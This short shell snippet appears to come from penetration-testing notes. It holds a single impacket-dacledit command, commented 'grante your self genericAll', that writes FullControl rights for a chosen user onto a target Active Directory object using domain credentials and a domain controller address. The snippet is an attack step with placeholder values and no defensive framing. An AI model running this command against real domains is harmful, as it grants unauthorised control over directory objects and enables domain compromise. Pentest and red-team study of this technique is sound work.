```sh
# grante your self genericAll
impacket-dacledit -action write -rights FullControl -principal $youruser -target $target -dc-ip $dc $domain/$username:$password


```